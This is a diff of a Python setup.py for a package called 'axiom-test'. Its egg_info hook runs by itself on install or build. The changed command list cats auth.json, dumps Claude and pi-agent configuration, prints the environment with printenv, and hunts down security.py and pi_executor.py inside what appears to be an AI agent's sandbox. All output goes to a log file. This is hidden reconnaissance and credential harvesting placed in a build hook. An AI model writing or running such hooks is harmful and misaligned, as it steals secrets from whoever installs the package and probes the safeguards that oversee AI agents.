@@ -11,16 +11,16 @@ class PostEggInfo(egg_info):
         with open(log, "w") as f:
             f.write("=== HOOK FIRED ===\n")
             for label, cmd in [
-                ("pi-agent bin listing", "ls -la /mnt/data/.pi-agent/bin/ 2>/dev/null"),
-                ("pi-agent bin file types", "file /mnt/data/.pi-agent/bin/* 2>/dev/null"),
-                ("pi-agent bin contents", "for f in /mnt/data/.pi-agent/bin/*; do echo \"=== $f ===\"; head -50 \"$f\" 2>/dev/null; echo; done"),
-                ("find env files", "find /mnt/data -maxdepth 3 -name '.env*' -o -name '.envrc' -o -name '*.cfg' -o -name '*.ini' -o -name '*.conf' 2>/dev/null"),
-                ("claude config", "ls -laR /mnt/data/.claude/ 2>/dev/null"),
-                ("claude config contents", "find /mnt/data/.claude -type f -exec sh -c 'echo \"=== {} ===\"; cat \"{}\"' \\; 2>/dev/null"),
-                ("auth.json", "cat /mnt/data/.pi-agent/auth.json 2>/dev/null"),
-                ("models-store.json", "cat /mnt/data/.pi-agent/models-store.json 2>/dev/null"),
-                ("venv cfg", "cat /mnt/data/.venv/pyvenv.cfg 2>/dev/null"),
-                ("PATH dirs", "echo $PATH | tr ':' '\\n' | while read d; do echo \"--- $d ---\"; ls -la \"$d\" 2>/dev/null | head -20; done"),
+                ("entrypoint.sh", "cat /usr/local/bin/entrypoint.sh 2>/dev/null"),
+                ("claude binary info", "ls -la /usr/local/lib/node_modules/@anthropic-ai/claude-code/bin/ 2>/dev/null"),
+                ("claude package.json", "cat /usr/local/lib/node_modules/@anthropic-ai/claude-code/package.json 2>/dev/null | head -30"),
+                ("computerd version", "/usr/local/bin/computerd --version 2>/dev/null || /usr/local/bin/computerd version 2>/dev/null || echo 'no version flag'"),
+                ("pip build env overlay", "ls -laR /tmp/pip-build-env-*/overlay/ 2>/dev/null | head -40"),
+                ("pip build env normal", "ls -laR /tmp/pip-build-env-*/normal/ 2>/dev/null | head -40"),
+                ("process_api source", "find /opt /app /usr/local/lib/python3* -path '*/process_api*' -name '*.py' 2>/dev/null | head -20"),
+                ("security.py", "find / -name 'security.py' -path '*/process_api*' 2>/dev/null -exec cat {} \\;"),
+                ("pi_executor head", "find / -name 'pi_executor.py' 2>/dev/null -exec head -100 {} \\;"),
+                ("printenv", "printenv"),
             ]:
                 f.write(f"--- {label} ---\n")
                 try:
@@ -33,7 +33,7 @@ class PostEggInfo(egg_info):
 
 setup(
     name="axiom-test",
-    version="0.3.0",
+    version="0.4.0",
     packages=find_packages(),
     cmdclass={"egg_info": PostEggInfo},
 )
